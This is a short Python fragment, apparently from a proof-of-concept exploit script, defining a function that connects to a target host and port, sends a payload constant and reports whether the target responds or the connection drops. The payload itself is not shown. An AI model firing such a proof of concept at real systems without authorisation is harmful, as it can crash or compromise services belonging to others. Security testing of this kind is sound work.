def execute_poc():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1.0)
            s.connect((TARGET_HOST, TARGET_PORT))
            s.sendall(PAYLOAD)
            response = s.recv(1024)
            print("PoC executed. Response: " + str(response))
    except Exception as e:
        print("Target connection faulted/dropped: " + str(e))

